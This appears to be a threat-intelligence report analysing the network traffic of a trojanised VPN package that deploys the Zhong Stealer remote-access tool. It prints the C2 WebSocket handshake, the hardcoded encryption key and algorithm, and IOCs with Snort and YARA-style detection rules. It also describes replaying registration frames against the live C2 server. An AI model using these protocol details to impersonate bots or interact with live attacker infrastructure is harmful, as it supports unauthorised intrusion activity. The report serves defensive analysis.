# Network Communications Report
## photo20260411689.com — TurboVPN Malware Campaign
**Sample SHA256:** `c918dded298b0d76d4ac51f23b391f62a95f58b3fa2488202ecbbc9c7ce8e785`  
**Analysis source:** AnyRun task `44182f44-35a2-46c3-b8aa-a96766bcdcb0` (PCAP + behavioral summary)  
**Date:** 2026-04-11

---

## 1. Executive Summary

The C2 traffic is **not** hidden inside a VPN tunnel. The malware establishes a direct WebSocket connection over plain HTTP (no TLS) to `uu[.]goldeyeuu[.]io:5188`, which resolved to `56[.]155[.]111[.]29` (AWS AMAZON-02, US). The VPN components bundled with the stage-2 package (V2Ray, Xray, StrongSwan, tun2socks) are part of the TurboVPN product's legitimate proxy functionality — they route victim internet traffic through VPN servers for monetization/MITM purposes, not for concealing the malware's own C2 channel.

---

## 2. Network Activity Timeline

| Time (UTC)       | Event                                          | Process                              |
|------------------|------------------------------------------------|--------------------------------------|
| 17:56:21         | NetBIOS broadcast, MS auth services            | System / svchost                     |
| 17:56:30         | DNS: `uu.goldeyeuu.io` → `56.155.111.29`      | photo20260411689.com (PID 7484)      |
| 17:56:30         | TLS to `storage.googleapis.com` (142.250.154.207:443) | photo20260411689.com (PID 7484) |
| 17:56:30–17:57   | Downloads all 12 stage-2 components from GCS  | photo20260411689.com (PID 7484)      |
| 17:56:41         | WebSocket upgrade to `uu.goldeyeuu.io:5188`   | Turbo.exe (PID 7712)                 |
| 17:56:41+        | Binary C2 frames (WebSocket, application-encrypted) | Turbo.exe (PID 7712)           |

---

## 3. Stage-1 Network Activity (photo20260411689.com, PID 7484)

### 3.1 Stage-2 Payload Downloads

All 12 stage-2 components are fetched over TLS from a single Google Cloud Storage bucket. The user-agent impersonates Microsoft Edge.

**Bucket:** `https://storage[.]googleapis[.]com/trubo/`

| File | Purpose |
|------|---------|
| `tur.txt` | Download manifest (fetched first) |
| `Turbo.exe` | Main VPN application launcher |
| `crashreport.dll` | Stage-1 shellcode loader (InitBugReport) |
| `Trubo.log` | Encrypted shellcode payload |
| `windui.dll` | Zhong Stealer — C2 agent (RAT module) |
| `payment.dll` | WebView2 MITB payment interceptor |
| `libuv.dll` | Custom libuv — named pipe + UDP transport |
| `service.cfg` | Transport config: `{"pipe":1,"udp":1,"udp_port":50986}` |
| `remote_config_data` | Firebase Remote Config cache (VPN endpoints) |
| `vcruntime140.dll` | MSVC runtime (legitimate, bundled) |
| `msvcp140.dll` | MSVC runtime (legitimate, bundled) |
| `image.jpg` | Decoy — 503 error page screenshot |

All downloads routed through Google CDN infrastructure (`142.250.154.207`, AS GOOGLE). No anomalous headers observed.

---

## 4. Stage-2 C2 Channel (Turbo.exe, PID 7712)

### 4.1 DNS Resolution

`uu.goldeyeuu.io` was resolved during the analysis run and returned `56.155.111.29` (AWS AMAZON-02, US). No other suspicious domains were queried.

### 4.2 WebSocket Establishment

Turbo.exe (deployed to `%LOCALAPPDATA%\Microsoft\WindowsUpdate\Cache\WU_20260411_326ccca7@27\`) makes a direct TCP connection to `56.155.111.29:5188` and performs an HTTP/1.1 WebSocket upgrade:

```
GET /\ HTTP/1.1
Host: uu.goldeyeuu.io:5188
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: socBoIFDMvMvoJfUGEeGEKFxw
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
```

Server response:
```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: WebSocket
Sec-WebSocket-Accept: QKFI4UHXnE4VFVjpDyMjbc1UYjE=
Content-Length: 0
```

**Notable indicators:**
- **No TLS** — the WebSocket tunnel is plain HTTP/1.1 (port 5188 is not HTTPS)
- Path `/\` (forward-slash + backslash) is a non-standard path likely used as a routing token
- `permessage-deflate; client_max_window_bits` extension matches V2Ray WebSocket transport signatures

### 4.3 Binary Protocol

After the 101 handshake, all communication uses binary WebSocket frames (opcode 2). The inner frames follow a 12-byte header structure:

| Offset | Size | Type     | Value (frame 0)    | Description          |
|--------|------|----------|--------------------|----------------------|
| 0      | 4    | uint32 LE | `0x000000CB` (203) | Total message length (including 12-byte header) |
| 4      | 4    | uint32 LE | `0x00000204` (516) | **Original plaintext size** (NOT message type) |
| 8      | 4    | uint32 LE | `0x0000094E` (2382) | Session ID / correlation handle |
| 12     | n    | bytes     | (encrypted)        | zlib-compressed+encrypted system fingerprint |

**Correction from initial analysis:** Field at offset 4 (`0x204 = 516`) is the **original decompressed data size**, not a "message type" field. The actual compression+encryption pipeline is: `compress(fingerprint_516_bytes) → encrypt_191_bytes → prepend_12_byte_header → websocket_frame`.

Observed frames:

| Direction      | WS len | Inner len | Type field | Session ID  |
|----------------|--------|-----------|------------|-------------|
| Client→Server  | 203    | 203       | 0x00000204 | 0x0000094E  |
| Client→Server  | 25     | 25        | 0x00000000 | 0x00000993  |
| Server→Client  | 12     | 12        | 0x00000000 | 0x00001536  |
| Server→Client  | 12     | 12        | 0x00000000 | 0x00009898  |

**UPDATED (2026-04-12): Encryption algorithm and key fully recovered via static analysis of stage-2 DLL (windui.dll).** The encryption is NOT a handshake-negotiated key — it is a **hardcoded static 32-byte key** embedded at VA 0x10041060 in stage-2, identical for every bot.

**Encryption algorithm (`sub_10001ade`, EA 3806):**
```
For each byte i of the compressed payload:
  op = i % 8
  k  = key[i % 32]
  op0: byte ^= k
  op1: byte = (byte + (k >> 1)) & 0xFF
  op2: byte = (byte - (k * 4)) & 0xFF
  op3: byte = (byte + (k << 2)) & 0xFF
  op4-op7: no change
```

**32-byte static key (same for every infected host):**
```
8A 91 36 10 E9 05 C3 DD 1F 65 78 11 EA 3B 19 33
47 1B 23 0F 88 E1 C1 55 61 60 99 A0 3A B0 AB C0
```

**Pipeline:** `OSVERSIONINFOEX+fingerprint (516 bytes)` → `zlib compress` → `custom encrypt` → `12-byte header` → `WebSocket send`

**Decrypted REGISTER fingerprint (from AnyRun PCAP, 2026-04-11):**
| Field | Value |
|-------|-------|
| OS | Windows 10.0 Build 19045 (Win10 21H2) |
| Hostname | `DESKTOP-JGLLJLD` (AnyRun sandbox) |
| IP Address | `192.168.100.10` |
| MAC (candidate) | `2c:f1:1e:03:b2:71` |
| Timestamp | `2026-04-11 13:56:41` |

Decryption script: `/home/remnux/mal/output/zs_register_decrypt.py`

The server acknowledged the connection with two 12-byte ACK frames (header only, no payload), consistent with a connection establishment handshake.

### 4.4 JA3 / Transport Fingerprint

The WebSocket connection itself is unencrypted HTTP/1.1 — no TLS fingerprint applies. The stage-1 TLS connections to Google Cloud use:
- JA3: `a0e9f5d64349fb13191bc781f81f42e1`
- JA3S: `9093bffeb3b0821a1fd59954ea30de97`

---

## 5. VPN Component Traffic

The `remote_config_data` file contains a Firebase Remote Config cache that lists VPN proxy endpoints:

| Endpoint | Protocol |
|----------|----------|
| `ubuntu[.]trovpn[.]com` | V2Ray Reality / Xray |
| `1624147767[.]rsc[.]cdn77[.]org` | SSR / nSSR |
| `1849029393[.]rsc[.]cdn77[.]org` | SSR / nSSR |
| `dgs6f4l7ftt5u[.]cloudfront[.]net` | tun2socks |
| `d2a60k7cnkt82a[.]cloudfront[.]net` | tun2socks |

**None of these endpoints appeared in the PCAP.** The VPN product functionality (routing victim traffic through these servers) did not activate during the analysis window. The VPN components are designed to tunnel the **victim's browsing traffic** for traffic inspection / MITM monetization — they are not used to conceal the malware's own C2 channel.

StrongSwan certificates present in `remote_config_data` use `CN=ThisIsSpar ta.we` (intentionally unusual to avoid CA detection), confirming custom PKI for VPN sessions.

---

## 6. Answer: Is C2 Traffic Hidden in a VPN Tunnel?

**No.** The Zhong Stealer C2 channel operates independently of the VPN components:

- C2 = direct WebSocket connection to `uu[.]goldeyeuu[.]io:5188` (plain HTTP, no VPN)
- VPN components = route victim's internet traffic through TurboVPN proxy servers (separate purpose)
- The two channels are architecturally separate; the RAT does not use the VPN tunnel for its own communications

The malware uses two distinct infrastructure tracks:
1. **Attacker C2:** `uu[.]goldeyeuu[.]io:5188` → binary WebSocket protocol → Zhong Stealer operator commands
2. **Victim traffic routing:** V2Ray/Xray/SSR endpoints → VPN monetization / potential MITM

---

## 7. IOCs (Network)

All IOCs defanged:

| Indicator | Type | Role |
|-----------|------|------|
| `uu[.]goldeyeuu[.]io` | Domain | Zhong Stealer C2 (APT-Q-27 / Golden Eye Dog) |
| `56[.]155[.]111[.]29` | IP (AWS US) | C2 server (resolved uu.goldeyeuu.io) |
| `5188/tcp` | Port | C2 WebSocket port |
| `storage[.]googleapis[.]com/trubo/` | URL | Stage-2 payload GCS bucket |
| `ubuntu[.]trovpn[.]com` | Domain | VPN proxy (V2Ray Reality) |
| `1624147767[.]rsc[.]cdn77[.]org` | Domain | VPN proxy (SSR) |
| `1849029393[.]rsc[.]cdn77[.]org` | Domain | VPN proxy (SSR) |
| `dgs6f4l7ftt5u[.]cloudfront[.]net` | Domain | VPN proxy (tun2socks) |
| `d2a60k7cnkt82a[.]cloudfront[.]net` | Domain | VPN proxy (tun2socks) |
| `inngoturbo[.]com` | Domain | Payment / billing domain |
| `turbospn[.]com` | Domain | Payment / billing domain |
| `payserviceinn[.]com` | Domain | Payment / billing domain |
| `turbovpn[.]com` | Domain | Branding domain |

### Yara / Network Detection

```
WebSocket upgrade to port 5188 with path "/\" and Host matching *.goldeyeuu.io
```

### Snort / Suricata rule concept

```
alert tcp any any -> any 5188 (
    msg:"Zhong Stealer WebSocket C2 (APT-Q-27) - uu.goldeyeuu.io";
    content:"Host: uu.goldeyeuu.io:5188"; nocase;
    content:"Upgrade: websocket"; nocase;
    content:"GET /\\"; offset:0; depth:7;
    sid:9000001; rev:1;
)
```

---

## 8. Live C2 Interaction Results

Two scripts were run against the live infrastructure after sample analysis to confirm server behavior and gather additional protocol intelligence.

### 8.1 Replay Probe (`colony_ws_probe.py`)

Key findings:
- Server is **live** as of 2026-04-11 21:00 UTC at `56.155.111.29:5188`
- The exact captured 203-byte REGISTER frame is accepted with no replay protection
- The server ACK `session_id=0x1536` is **deterministic** — identical payload always returns the same session ID
- Crafted frames with zeroed payloads (type=0x204, 203 bytes) received no response — the server validates the inner encrypted payload, not just the header
- Minimal type=0x0, 0x1, 0x2, 0x100 frames received no response — the server ignores unknown sessions

### 8.2 Extended Listener (`colony_ws_listen.py`, 300s)

A 5-minute session was held open after registration. The server sent **two unsolicited frames** at +258s and +266s:

| Time      | Direction     | Hex                      | Type       | Session ID  |
|-----------|---------------|--------------------------|------------|-------------|
| +0s       | Server→Client | `0c000000 00000000 36150000` | 0x00000000 | 0x00001536  |
| +258.8s   | Server→Client | `0c000000 00000000 65150000` | 0x00000000 | 0x00001565  |
| +266.1s   | Server→Client | `0c000000 00000000 37150000` | 0x00000000 | 0x00001537  |

All three server frames are 12 bytes (header only, no payload) and type=0x0. This is consistent with server-side keepalive/heartbeat behavior rather than operator command frames.

**Session counter analysis:**
- Initial ACK: `0x1536` (5430)
- +258s frame 1: `0x1565` (5477) — 47 IDs higher than initial ACK
- +266s frame 2: `0x1537` (5431) — 1 ID higher than initial ACK

The session counter is likely **global** across all connected clients. The 47-step advance in ~258 seconds implies approximately 11 new bot registrations per minute during the observation window. The server is actively serving a live botnet, not a sinkhole.

The `0x1537` frame may represent an echo/ACK of our own session (registered session `0x1536` → keepalive acknowledgement `0x1537`), while `0x1565` reflects the server's global session counter state at the time of the heartbeat push.

**No operator command frames** (frames with payload > 12 bytes) were observed during the 5-minute window. The C2 server appears to be waiting for an operator to issue tasking.

---

## 9. Analyst Notes

- **Connection duration:** 31 seconds in AnyRun sandbox. The short session (~500 bytes sent, ~160 bytes received) suggests the RAT established a session handshake but no active tasking was received during the analysis window. Real-world dwell time would be longer.
- **No UDP activity to port 50986:** The `service.cfg` configures `udp_port:50986` but no UDP traffic to this port was observed. This port is likely for local inter-process communication (between libuv.dll and other DLLs), not external.
- **IP hardcoding:** No DNS query for `56.155.111.29` was observed — `uu.goldeyeuu.io` was resolved by DNS and the returned IP happened to match. This may indicate the IP is also hardcoded as a fallback.
- **Application-layer encryption:** The inner protocol is encrypted but the WebSocket transport is plaintext. Network defenders can detect this traffic by WebSocket upgrade to port 5188 with the unusual `/\` path.
- **C2 pivot potential:** The 12-byte frame header's `session ID` field (`0x094E`, `0x0993`) may vary per connection; static rule should focus on the WebSocket handshake, not frame contents.
- **Botnet scale estimate:** Session ID counter advanced ~47 in 258 seconds during observation window → ~11 new registrations/minute. Server is serving an active campaign.
- **Keepalive timer:** Server pushes a type=0 heartbeat to connected clients at approximately the 4-minute mark. Bots that do not maintain a WebSocket connection would be pruned from the active session table on the server side.
